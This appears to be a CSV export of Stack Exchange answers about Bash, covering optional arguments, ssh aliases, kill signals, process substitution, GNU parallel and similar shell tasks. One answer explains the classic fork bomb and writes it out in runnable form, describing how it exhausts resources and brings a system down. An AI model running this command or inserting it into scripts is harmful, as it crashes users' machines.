Title,Id,Tags,Score,Body
"Bash: optionally passing arguments to a command","802539","<bash><shell-script><bash-scripting><command-line-arguments>","26","<p>I've solved the problem with the bash <code>${var:+...}</code> syntax, (<a href=""http://mywiki.wooledge.org/BashFAQ/050#I_only_want_to_pass_options_if_the_runtime_data_needs_them"" rel=""noreferrer"">reference</a>).</p>

<p>The script now changes to</p>

<pre><code>curl \
    ${title:+ --data-urlencode ""title=${title}""} \
    http://example.com
</code></pre>

<p>which works perfectly.</p>

<p>Also see:</p>

<ul>
<li><a href=""https://stackoverflow.com/q/13206311/1232832"">Bash - function with optional arguments and missing logic</a></li>
<li><a href=""https://stackoverflow.com/q/9332802/1232832"">How to write a bash script that takes optional input arguments?</a></li>
</ul>
"
"loading local shell aliases to ssh session dynamicaly","503784","<linux><bash><shell><login><ssh>","26","<p>You can temporarily copy your <code>.bashrc</code> to your remote machine with another name. For example, using <code>.bashrc_temp</code>:</p>

<pre><code>user@local$ scp .bashrc user@remote:~/.bashrc_temp
</code></pre>

<p>Afterwards you can log into the remote machine:</p>

<pre><code>user@local$ ssh user@remote
</code></pre>

<p>and <a href=""http://linux.about.com/library/cmd/blcmdln_source.htm"" rel=""noreferrer""><code>source</code></a> the file <code>.bashrc_temp</code>:</p>

<pre><code>user@remote$ source ~/.bashrc_temp
</code></pre>

<p>Now you are able to use your <code>.bashrc</code> and your functions. When you are finished with your work you can remove the file ~/.bashrc_temp on the remote machine and logout.</p>

<p>The copying of the file and the login to the remote machine may be achieved with a bash function:</p>

<pre><code># copy the .bashrc to the remote machine 
# and log into the remote machine.
# parameter $1: user@remote
function s() {
  scp ~/.bashrc $1:~/.bashrc_temp
  ssh $1
}
</code></pre>

<p><strong>Update</strong>: </p>

<p>You may also consider to copy the <code>.bashrc</code> to <code>/tmp</code> on your remote machine and source <code>/tmp/.bashrc_temp</code>.</p>

<p><strong>Update 2</strong>:</p>

<p>You can log into the remote machine by using <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?ssh%201"" rel=""noreferrer"">ssh -t</a>. This will automatically use your temp <code>.bashrc</code>. Updated function <code>s()</code>:</p>

<pre><code>function s() {
  scp ~/.bashrc $1:/tmp/.bashrc_temp
  ssh -t $1 ""bash --rcfile /tmp/.bashrc_temp ; rm /tmp/.bashrc_temp""
}
</code></pre>
"
"create mysql database with one line in bash","288621","<command-line><bash><mysql><database>","26","<p>@Nitrodist's answer will work, but it's over-engineering the problem. MySQL's command-line client supports the very handy <code>-e</code> switch, like so:</p>

<pre><code>mysql -uroot -e ""create database 'foo'""
</code></pre>

<p>You can of course substitute any valid SQL into there.</p>
"
"Why did ; after & return an unexpected token error in bash?","269429","<linux><bash>","26","<p>You don't need the semicolon.  After it's sent to the background it's free to get another command.</p>

<pre><code>evince foo.pdf bar.pdf &amp; emacs foo.tex &amp;
</code></pre>
"
"How to update bash on Mac OS X Yosemite","857250","<macos><bash><shell><shell-script><bash-scripting>","26","<p>Your problem is in your first line. You have this:</p>

<pre><code>#!/bin/bash
</code></pre>

<p>which explicitly states that the shell script should be ran with the old <code>/bin/bash</code>.
What you <em>really</em> want, is this:</p>

<pre><code>#!/usr/local/bin/bash
</code></pre>

<p>to use the new <code>bash</code> from <code>/usr/local/bin</code>.</p>
"
"What is /usr/bin/[ and how do I use it?","334549","<linux><bash><coreutils>","26","<p>It's an equivalent of the command <code>test</code>. (See <code>info test</code>.) Generally you use it in scripts in conditional expressions like:</p>

<pre><code>if [ -n ""$1"" ]; then
    echo $1
fi
</code></pre>

<p>The closing bracket is required to enclose the conditional. (Well, it looks like its required just to look nicer in the code. Does anybody know any other practical reason for it?)</p>
"
"How to take sha256sum of file and compare to check in one line?","1312740","<bash><hashing>","26","<p>I have downloaded an archive file and an accompanying checksum file.
Here is how I verify that the hash of the downloaded archive matches the hash from the downloaded checksum file:</p>

<pre><code>echo ""$(cat archive.tar.gz.sha256) archive.tar.gz"" | sha256sum --check --status
</code></pre>

<p>The <code>--status</code> flag prevents all stdout output (more effective than <code>--quiet</code>). I then need to rely on the return code to determine if they matched, which is what I want anyway since I'm going to be using this in a script.</p>
"
"What does this cryptic Bash command mean?","166755","<bash>","25","<p>It's, as you said, a forkbomb. What it does is define a function, then call it. The function is called <code>:</code>.</p>

<p>Let's name it <code>forkbomb</code> so we can better see what's going on:</p>

<pre><code>forkbomb(){ forkbomb|forkbomb&amp; };forkbomb
</code></pre>

<p>As you can see, and probably guess from your programming experience, the first part is the function definition (<code>forkbomb(){ ... }</code>), and the very last <code>:</code> is where the function gets called (the <code>;</code> just separates statements in Bash).</p>

<p>Now, what does this function do? If you're familiar with Bash, you'll know that the <code>|</code> character pipes the standard output of one command/program to the standard input of another. So basically, <code>:|:</code> starts up <strong>two</strong> instances of the function (this is where it ""forks"").</p>

<p>And then the magic: the <code>&amp;</code> puts those commands in the background, allowing the original function to return, while each instance forks 'til the cows come home in the background, thus using up all your resources and taking down the system (unless it has limits imposed on it).</p>
"
"Keep running command until output differs from previous run in Bash","1602243","<bash>","25","<p>From <a href=""https://man7.org/linux/man-pages/man1/watch.1.html#OPTIONS"" rel=""noreferrer""><code>man 1 watch</code></a>:</p>
<blockquote>
<p><code>-g</code>, <code>--chgexit</code><br />
Exit when the output of <em>command</em> changes.</p>
</blockquote>
<p><code>watch</code> is not required by POSIX but it's quite common anyway. In Debian or Ubuntu it's in the <code>procps</code> package along with <code>kill</code> and <code>ps</code> (and few other tools).</p>
<p>Example:</p>
<pre><code>watch -g -n 5 'date +%H:%M'
</code></pre>
"
"What is the default password of screen?","343965","<linux><bash><display>","25","<p>The screen password has always been simply the system password of the user running it in my experience.
the <a href=""http://www.manpagez.com/man/1/screen/"">manpage</a> says that if there's a screen lock program available, it will be used if configured so. So maybe you would need to figure out if this is the case, and how that program behaves.</p>
"
"Bash Man Page: kill <pid> vs kill -9 <pid>","107543","<unix><bash><kill><manpages>","25","<p><code>kill</code> just sends a signal to the given process. The <code>-9</code> tells it which signal to send.</p>

<p>Different numbers correspond to different common signals. <code>SIGINT</code>, for example, is 2, so to send a process the <code>SIGINT</code> signal issue the command</p>

<pre><code>$ kill -2 &lt;pid&gt;
</code></pre>

<p>The <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?kill"" rel=""noreferrer"">manpage here</a> specifies:</p>

<blockquote>
  <p><strong>The  default  signal  for  kill is TERM.</strong></p>
</blockquote>

<p>The manpage also provides a table of signals you can send.  According to this table, <code>TERM</code> is <code>15</code>, so these are all equivalent:</p>

<pre><code>kill &lt;pid&gt;
kill -15 &lt;pid&gt;
kill -TERM &lt;pid&gt;
</code></pre>

<p>Notice 9 is the <code>KILL</code> signal.</p>

<pre><code>   Name   Number  Action
   -----------------------
   ALRM      14   exit
   HUP        1   exit
   INT        2   exit
   KILL       9   exit  this signal may not be blocked
   PIPE      13   exit
   POLL           exit
   PROF           exit
   TERM      15   exit     [Default]
   USR1           exit
   USR2           exit
   VTALRM         exit
   STKFLT         exit  may not be implemented
   PWR            ignore    may exit on some systems
   WINCH          ignore
   CHLD           ignore
   URG            ignore
   TSTP           stop  may interact with the shell
   TTIN           stop  may interact with the shell
   TTOU           stop  may interact with the shell
   STOP           stop  this signal may not be blocked
   CONT           restart   continue if stopped, otherwise ignore
   ABRT       6   core
   FPE        8   core
   ILL        4   core
   QUIT       3   core
   SEGV      11   core
   TRAP       5   core
   SYS            core  may not be implemented
   EMT            core  may not be implemented
   BUS            core  core dump may fail

   XCPU           core  core dump may fail
   XFSZ           core  core dump may fail
</code></pre>
"
"Check number of pending security updates in Ubuntu","199869","<linux><ubuntu><bash><shell><nagios>","25","<p>The Nagios plugin <code>/usr/lib/nagios/plugins/check_apt</code> does not detect critical updates in Ubuntu correctly due how it detects critical updates via <code>apt</code> combined with how Ubuntu non-critical updates are published. More details are in the bug here: <a href=""https://bugs.launchpad.net/bugs/1031680"" rel=""noreferrer"">https://bugs.launchpad.net/bugs/1031680</a></p>

<p>Using <code>/usr/lib/update-notifier/apt-check</code> instead is a reliable workaround.</p>
"
"warning: line editing not enabled","240223","<bash>","25","<p>You need to source that script. Do <code>. ./bind</code> or <code>source ./bind</code> to make that key binding active in the current session.</p>

<p>Running it normally, it doesn't have a terminal so it gives you that error message. Also, if it were to work, it would only be active for the duration of the script.</p>

<p>If you want that keybinding to be persistent, add that command to your <code>~/.bashrc</code>.</p>
"
"How to zip a list of files in Linux","834959","<bash><zip>","25","<p>Very simple:</p>

<pre><code>zip archive -@ &lt; out.txt
</code></pre>

<p>That is, if your <code>out.txt</code> file contains one filename per line. It will add all the files from <code>out.txt</code> to one archive called <code>archive.zip</code>.</p>

<p>The <code>-@</code> option makes <code>zip</code> read from STDIN.</p>

<p>If you want to skip creating a temporary <code>out.txt</code> file, you can use <code>grep</code>'s capability to print filenames, too. <code>-r</code> enables recursive search (might not be necessary in your case) and <code>-l</code> prints only filenames:</p>

<pre><code>grep -rl ""abc"" file-* | zip archive -@
</code></pre>
"
"Linux command line to turn off proxy","196166","<ubuntu><bash><proxy>","25","<p>As the other answer says there are some programs that don't look at the system at all you may have to set them up individually. For instance wget has a number of proxy options, that can be used to ignore or adapt the environmental proxy config during execution. Here are a number of areas in which the systems proxys can be set up. </p>

<ul>
<li>How my system looks, note that you
will have to change the specifed
system configuration for you
networking Environment.</li>
</ul>

<p>Some Linux systems use /etc/environment</p>

<pre><code>$ cat /etc/environment 
PATH=""/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games""
http_proxy=""http://192.168.1.250:8080/""
ftp_proxy=""ftp://192.168.1.250:8080/""
https_proxy=""https://192.168.1.250:8080/""  
</code></pre>

<p>There is no uniform single set up other use env</p>

<pre><code>$ env | grep -i proxy
NO_PROXY=localhost,127.0.0.0/8,127.0.1.1
http_proxy=http://192.168.1.250:8080/
FTP_PROXY=ftp://192.168.1.250:8080/
ftp_proxy=ftp://192.168.1.250:8080/
all_proxy=socks://192.168.1.250:8080/
ALL_PROXY=socks://192.168.1.250:8080/
HTTPS_PROXY=https://192.168.1.250:8080/
https_proxy=https://192.168.1.250:8080/
no_proxy=localhost,127.0.0.0/8,127.0.1.1
HTTP_PROXY=http://192.168.1.250:8080/  
</code></pre>

<p>I would check out the ~/.bashrc to have setting applied automatically on system start up. </p>

<pre><code>$ man env
$ man set
$ # The file section near the end of the bash manual.
$ man bash 

FILES
       /bin/bash
              The bash executable
       /etc/profile
              The systemwide initialization file, executed for login shells
       /etc/bash.bashrc
              The systemwide per-interactive-shell startup file
       /etc/bash.bash.logout
              The systemwide login shell cleanup file, executed when  a  login
              shell exits
       ~/.bash_profile
              The personal initialization file, executed for login shells
       ~/.bashrc
              The individual per-interactive-shell startup file
       ~/.bash_logout
              The  individual  login shell cleanup file, executed when a login
              shell exits
       ~/.inputrc
              Individual readline initialization file
</code></pre>
"
"Tab-completion with directories/links","155167","<linux><bash><symbolic-link><autocomplete>","25","<blockquote>
<p><code>echo &quot;set mark-symlinked-directories on&quot; &gt;&gt; ~/.inputrc</code></p>
<p><kbd>Ctrl</kbd>+<kbd>x</kbd>, then <kbd>Ctrl</kbd>+<kbd>r</kbd></p>
</blockquote>
<p>via <a href=""http://bit.ly/r5xp1B"" rel=""noreferrer"">Ubuntu Forums - Strange bash shell tab completion behaviour</a></p>
"
"Why use echo before installing new software?","1165820","<linux><ubuntu><command-line><bash><echo>","25","<p>Ordinarily the function of <code>echo</code> command is to display a string (piece of text) on the console. But this time, a <code>&gt;</code> character is added after the <code>echo</code> command, redirecting its output to a text file, <code>/etc/apt/sources.list.d/ros-latest.list</code>.</p>

<p>So basically, this whole command writes a piece of text to a text file. Now, here comes the tricky part:</p>

<p>The string written to the file may be different for each computer. The part <code>$(lsb_release -sc)</code> is resolved (changed into something else) when the <code>echo</code> command runs.</p>

<p>You can open <code>/etc/apt/sources.list.d/ros-latest.list</code> in a text editor before and after the command to see the change for yourself. (The file might not exist before this command.)</p>
"
"Tmux current pane border not obvious","547883","<bash><tmux>","25","<p>This issue is resolved in the current version of tmux. When there are only two splits the upper/lower half of the split line is colored to indicate that the left/right split is active</p>

<p><img src=""https://i.stack.imgur.com/iufP5.gif"" alt=""enter image description here""></p>
"
"Bash not loading '.profile' in new session on Linux","176404","<bash><terminal><shell><bashrc><.bash-profile>","25","<p>When Bash starts as an interactive login shell, one of the files it <em>may</em> process is <code>~/.profile</code>.</p>

<p>When it starts as an interactive non-login shell it doesn't. It processes <code>/etc/bash.bashrc</code> (if that file or a similar file is enabled in your version of Bash) and  <code>~/.bashrc</code>.</p>

<p>You could add the following to your <code>~/.bashrc</code> (but be careful of loops or values being changed inadvertently):</p>

<pre><code>. $HOME/.profile
</code></pre>
"
"bash - remove all directories (and contents) but not files in pwd","713741","<linux><bash><mingw>","24","<p>No that would give you ""missing operand"" since you didn't specify anything. Putting a <code>*</code> would prompt also for files.</p>

<p>I'd give a try to:</p>

<pre><code>find -mindepth 1 -maxdepth 1 -type d -exec rm -r {} \;
</code></pre>

<p>The <code>mindepth 1</code> will exclude <code>.</code> from the results, the <code>maxdepth 1</code> will exclude trying to do under the directories that will anyway get deleted (therefore creating a warning). But in practice you could leave them both out if you agree to have a few ""innocent"" warnings.</p>
"
"Passing two arguments to a command using pipes","317819","<bash><shell-script><pipe><bash-scripting><command-line-arguments>","24","<p>I think you want 'Process Substitution' <a href=""http://tldp.org/LDP/abs/html/process-sub.html"" rel=""noreferrer"">http://tldp.org/LDP/abs/html/process-sub.html</a>.  It  also works on zsh, though it has more options and the syntax may be different.</p>

<p>It creates a pseudo file (<code>/dev/fd/something</code>) for each substitution. It's pretty useful. The command can only read as a stream, meaning it can not go back and forth with fseek. It needs to read it as a stream of bytes, like a pipe.</p>

<p>Your examples work as process substitution:</p>

<pre><code>cat &lt;(echo abc) &lt;(echo xyz)
paste -d, &lt;(cut -f2 -d, file1) &lt;(cut -f1 -d, file2)
</code></pre>

<p>Think of it as a tool to use a process and have it pretend to be a file without any temp files.</p>

<p>(from my <a href=""https://superuser.com/questions/201724/multiple-standard-input-how/201728#201728"">earlier answer</a> )</p>
"
"Escape non-printing characters in a function for a Bash prompt","301353","<bash><prompt><ansi>","24","<p>The <em>readline</em> library accepts <code>\001</code> and <code>\002</code> (ASCII <a href=""http://en.wikipedia.org/wiki/C0_and_C1_control_codes#C0_.28ASCII_and_derivatives.29"" rel=""noreferrer"">SOH and STX</a>) as non-printable text delimiters. These also work in any application that uses <em>readline</em>.</p>

<p>From <code>lib/readline/display.c:243</code> in <em>bash</em> source code:</p>

<pre><code>243 /* Current implementation:
244         \001 (^A) start non-visible characters
245         \002 (^B) end non-visible characters
246    all characters except \001 and \002 (following a \001) are copied to
247    the returned string; all characters except those between \001 and
248    \002 are assumed to be `visible'. */
</code></pre>

<p>The <em>bash</em>-specific <code>\[</code> and <code>\]</code> are in fact translated to <code>\001</code> and <code>\002</code> at <code>y.tab.c:7640</code>.</p>

<hr>

<p>Note: If you use <em>bash</em>'s <code>printf</code> or <code>echo -e</code>, and if your text has <code>\001</code> or <code>\002</code> immediately before a number, you'll hit a <em>bash</em> bug that causes it to eat one digit too many when processing octal escapes – that is, <code>\00142</code> will be interpreted as octal 014 (followed by ASCII ""2""), instead of the correct octal 01 (followed by ASCII ""42""). For this reason, use hexadecimal versions <code>\x01</code> and <code>\x02</code> instead.</p>
"
"How do I chain commands on the console?","235761","<command-line><bash>","24","<p>Use <code>&amp;&amp;</code> operator,</p>

<pre><code>cmd1 &amp;&amp; cmd2 &amp;&amp; cmd3
</code></pre>

<hr>

<p>In shellscripting, <code>&amp;&amp;</code> and <code>||</code> operators are modelled after optimized implementation of logical operators in C. <code>&amp;&amp;</code> means AND operator, and <code>||</code> means OR. Unix is tightly related to C, and in C, the second operand of logical operators isn't evaluated if the result is already known from the first operand. E.g. <code>""false &amp;&amp; x""</code> is <code>false</code> for any <code>x</code>, so there is no need to evaluate <code>x</code> (especially if <code>x</code> is a function call); similarly for <code>""true || x""</code>. This is also called <strong><a href=""http://en.wikipedia.org/wiki/Short-circuit_evaluation"" rel=""nofollow noreferrer"">short-circuiting</a> semantics</strong>.</p>

<p>And in Unix, it is traditional to interpret commands' return values as ""successful completion"" truth values: exit code 0 means <code>true</code> (success), nonzero means <code>false</code> (failure). So, when the first command in <code>cmd1 &amp;&amp; cmd2</code> returns <code>""false""</code> (nonzero exit status, which indicates failure), the compound command's status is known: failure. So overall interpretation of <code>cmd1 &amp;&amp; cmd2</code>  may be: ""execute <code>cmd1</code>, AND THEN, if it didn't fail, <code>cmd2</code>"". Which is what you basically want in your question.</p>

<p>Similarly with OR: <code>cmd1 || cmd2</code> can be interpreted as ""execute <code>cmd1</code>, OR IF it fails, <code>cmd2</code>"".</p>

<hr>

<p><em>Protip:</em> for longer chains of <code>&amp;&amp;</code>, consider putting <strong><code>set -e</code></strong> in your script. It basically changes the semicolon <code>;</code> into <code>&amp;&amp;</code>, with a couple of special cases.</p>
"
"Count of files in each sub-directories","474334","<linux><bash>","24","<p>Assuming you want a recursive count of files only, not directories and other types, something like this should work:</p>

<pre><code>find . -maxdepth 1 -mindepth 1 -type d | while read dir; do
  printf ""%-25.25s : "" ""$dir""
  find ""$dir"" -type f | wc -l
done
</code></pre>
"
"Understanding control characters in .inputrc","269464","<bash><inputrc>","24","<p>These are <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code"" rel=""nofollow noreferrer"">ANSI control-code escape sequences</a> that are transmitted when various non alphanumeric keys are pressed on a ""terminal"" keyboard.</p>

<p>\e means the ASCII ""ESCAPE"" character (octal 033 hex 1B decimal 27). Which is part of a command sequence 
introduction (CSI).</p>

<p><code>Escape [ 2 ~</code> is a character sequence transmitted when you press the key labelled ""Insert"" on a <a href=""http://en.wikipedia.org/wiki/VT220"" rel=""nofollow noreferrer"">VT220 (or later) terminal</a>.</p>

<p>Many of these conventions have been adopted in software such as xterm and Linux consoles / shells - often extended in various, sometimes incompatible ways.</p>

<p><strong>The use of these sequences in bash's READLINE function is described in the <a href=""https://en.wikipedia.org/wiki/Man_page"" rel=""nofollow noreferrer"">man pages</a> for <a href=""https://linux.die.net/man/3/readline"" rel=""nofollow noreferrer"">readline</a></strong></p>

<pre>
       In  the  second  form,  ""keyseq"":function-name or macro, keyseq differs
       from keyname above in that strings denoting an entire key sequence  may
       be  specified  by  placing the sequence within double quotes.  Some GNU
       Emacs style key escapes can be used, as in the following example,  but
       the symbolic character names are not recognized.

          ""\C-u"": universal-argument
          ""\C-x\C-r"": re-read-init-file
          ""\e[11~"": ""Function Key 1""

</pre>

<p>To get a list of which escape sequences correspond to which keyboard-keys, you can use a command such as <code>infocmp -L -1</code> or <code>infocmp -L -1 xterm</code></p>
"
"How to exit SSH of vagrant in terminal","704032","<linux><bash><ssh><vagrant>","24","<p>Assuming the <code>run</code> command stays running on the foreground, you can most probably end it with <code>CTRL+C</code>. Then the shell (and SSH) session can be terminated with <code>exit</code> or <code>CTRL+D</code>.</p>
"
"How to create a file and insert a line in it using OS X terminal","728800","<macos><command-line><bash><terminal>","24","<p><strong>Quick Answer</strong></p>

<pre><code>touch ~/.inputrc
echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p><strong>Explanation</strong></p>

<p>First, create the file:</p>

<pre><code>touch ~/.inputrc
</code></pre>

<p>Then, add the contents to the file:</p>

<pre><code>echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p><code>touch</code> creates an empty file (assuming that the <code>~/.inputrc</code> file does not already exist). <code>echo</code> writes text to the ""standard output"" (""stdout"" for short), which is normally your screen, but because of the redirection (<code>&gt;&gt;</code>), the output is redirected to <code>~/.inputrc</code>. This setup will append the line to the file.</p>

<p>If <code>~/.inputrc</code> already exists and you want to <em>erase</em> (clobber) its contents, and then write the line into it (i.e., create a file with <em>only</em> this line of text), do:</p>

<pre><code>echo ""set completion-ignore-case On"" &gt; ~/.inputrc
</code></pre>

<p>The single arrow (<code>&gt;</code>), a.k.a. ""greater than"" symbol, tells <code>echo</code> to create a file with only the given text as the contents of the file, instead of writing the contents to the end of the file. (Actually, <code>echo</code> does not create the file; the shell creates the file, discarding any existing contents, and the <code>echo</code> command writes the new contents.)</p>

<hr>

<p>If you use the first approach (with the <code>&gt;&gt;</code>) and you find that the line that you added is smushed onto the previous line, e.g.,</p>

<pre>some stuff here
some more stuff here<b>set completion-ignore-case On</b></pre>

<p>then you need to edit the file to fix it.
This would happen if the last line of the pre-existing file ended with a textual character rather than a ""newline"" character (i.e., an end-of-line marker). This is common for <code>.TXT</code> files on Windows, but rare on *nix.</p>

<p>If you somehow realize in advance that your <code>.inputrc</code> file has pre-existing contents that do not end with a newline,
then you should use this <code>echo</code> statement instead:</p>

<pre><code>echo -e ""\nset completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p>The <code>\n</code> before the phrase is interpreted as a newline character, so a newline is added after the previous contents and before the new stuff you want to add.</p>

<p>Or, slightly more typing but much more readable,</p>

<pre><code>echo """" &gt;&gt; ~/.inputrc
echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code></pre>

<p>or</p>

<pre><code>(echo """"; echo ""set completion-ignore-case On"") &gt;&gt; ~/.inputrc
</code></pre>

<p>which do the same thing; i.e., provide the missing newline character to the existing text, and then add the <code>set completion-…</code> command after that.</p>
"
"ssh and shell through ssh : how to exit?","207453","<bash><ssh><shell-script>","24","<p>The exit in the shell script does not work because it is exiting from the script, not the shell. To exit from the shell after the script completes do</p>

<pre><code>ssh user@ipaddress '~/my_script.sh &amp;&amp; exit'
</code></pre>

<p>This will run the script then exit from the shell.</p>
"
"Equivalent of bash's `source` command in Powershell?","71446","<bash><powershell>","24","<p>You can ""<a href=""https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-6&amp;viewFallbackFrom=powershell-Microsoft.PowerShell.Core#script-scope-and-dot-sourcing"" rel=""noreferrer"">dot source</a>"" in PowerShell as well. You just need to make sure that you specify the full path. So, if the script you want to load is in the local directory you would do:</p>

<pre><code>PS C:\&gt;. .\myscript.ps1
</code></pre>
"
"Running commands in parallel with a limit of simultaneous number of commands","153630","<linux><bash><parallel-processing>","24","<p><a href=""http://www.gnu.org/software/parallel/"" rel=""noreferrer"">GNU Parallel</a> is made for this.</p>

<pre><code>seq 1 1000 | parallel -j20 do_something
</code></pre>

<p>It can even run jobs on remote computers. Here's an example for re-encoding an MP3 to OGG using server2 and local computer running 1 job per CPU core:</p>

<pre><code>parallel --trc {.}.ogg -j+0 -S server2,: \
     'mpg321 -w - {} | oggenc -q0 - -o {.}.ogg' ::: *.mp3
</code></pre>

<p>Watch an intro video to GNU Parallel here:</p>

<blockquote>
  <p><a href=""http://www.youtube.com/watch?v=OpaiGYxkSuQ"" rel=""noreferrer"">http://www.youtube.com/watch?v=OpaiGYxkSuQ</a></p>
</blockquote>
"
"how to add a day to date in bash?","45592","<bash><date>","24","<p>Just use the <code>date</code> command with <code>-d</code> option: </p>

<pre><code>$ date -d ""1983-08-04 348 days""
Tue Jul 17 00:00:00 BST 1984  
</code></pre>

<p>You can change the output format if you want:</p>

<pre><code>$ date -d ""1983-08-04 2 days"" +%Y-%m-%d
1983-08-06                                           
</code></pre>
"
"What causes bash to pause after a bad command?","394153","<bash>","24","<p>This type of behavior is caused by a tool frequently installed on some distributions that hook into bash.  This hook makes it so that if you try to run a command, and the command doesn't exist, then bash will search the files available in the configured repositories, and tell you what package you would need to install to get that command.</p>

<p>If you are not on a Debian system you'll want to look at your bash startup files profiles and so on and see if anything defines the function named <code>command_not_found_handle</code>.  If that bash function is defined, then it will be called whenever you run a command and an appropriate program cannot be found in your search path.  If you run <code>typset | less</code> and browse through the output you will see the <code>command_not_found_handle()</code> function if it has been defined.</p>

<p>On Debian/Ubuntu the package that provides this behavior is <a href=""http://packages.debian.org/sid/command-not-found"" rel=""noreferrer"">command-not-found</a>.  If you purge that, then you will disable the lookups which does slow things down.</p>

<p>Here is an example</p>

<pre><code># command-not-found installed
$ time pwgen
The program 'pwgen' is currently not installed.  To run 'pwgen' please ask your administrator to install the package 'pwgen'
pwgen: command not found

real    0m0.074s
user    0m0.032s
sys     0m0.040s

# purge command-not-found and restart bash
$ time pwgen
-bash: pwgen: command not found

real    0m0.002s
user    0m0.000s
sys     0m0.000s
</code></pre>

<p>The exact time would of course be different for you.  I ran my tests on a pretty beefy server.</p>
"
"Is there a one line command to make chmod interactive?","868379","<linux><command-line><bash>","24","<p>This does what you are looking for:</p>

<pre><code>find . -maxdepth 1 -type f -print0 | xargs -L1 -p0 chmod +x
</code></pre>

<p>This uses <code>find</code> rather than <code>ls</code> because, generally, <a href=""http://mywiki.wooledge.org/ParsingLs"" rel=""nofollow noreferrer"">parsing <code>ls</code> output is unreliable</a>.  This form, using <code>find</code>, however, will work with filenames even if they contain newlines or other difficult characters.</p>

<p>Explanation</p>

<ul>
<li><p><code>find . -maxdepth 1 -type f -print0</code></p>

<p>This selects the files.  This can be customized using any of find's many options.  The option <code>print0</code> tells <code>find</code> to print the file names in a null-separated list.  This is the only reliable to transmit lists of file names.</p></li>
<li><p><code>xargs -L1 -p0 chmod +x</code></p>

<p>This takes the null-separated list of file names generated by <code>find</code> and applies your command to them.</p></li>
</ul>

<p>The <code>-L1</code> option tells <code>xargs</code> to work on only one file name at a time.  The <code>-p</code> option tells <code>xargs</code> to prompt for approval before continuing.  The <code>-0</code> option tells <code>xargs</code> to use the null character as the delimiter between file names.</p>

<p>[I was unaware of the <code>-p</code> option to <code>xargs</code> until @kwan pointed it out.]</p>
"
"How to find the default file manager?","465495","<linux><bash><gnome><kde>","23","<p>There is no such thing as a ""Default File Manager for Linux"". It all depends how you might be trying to open one. If you ask XDG, then you'll have to check what XDG thinks this file manager should be. Same deal for any other ""environment"", such as Gnome, or KDE. If you have all of them installed, it's perfectly possible (and fine) for each of them to have a different ""default file manager"".</p>

<p>The case for default apps seems to come mainly from Windows. Over there, we only have one environment, the one Windows presents us with. As such, the notion of a default application is indeed effectively system wide. This is not the case with Linux.</p>

<p>What you might perceive as default apps under Linux, such as what is stored in the $EDITOR environment variable, is not as much a ""true"" default app, as simply a convention used by a lot of people who write system tools and scripts. Feel free to define $FILEMANAGER, if that suits your use case.</p>
"
"Is there a standard unix program that returns a range of numbers","600667","<bash><unix>","23","<p><code>seq</code> is part of coreutils.</p>

<pre><code>for i in $( seq 1 2 11 ) ; do echo $i ; done
</code></pre>

<p>Output:</p>

<pre><code>1
3
5
7
9
11
</code></pre>

<p>If you provide only 2 arguments to <code>seq</code>, the increment is 1:</p>

<pre><code>$ seq 4 9
4
5
6
7
8
9
</code></pre>
"
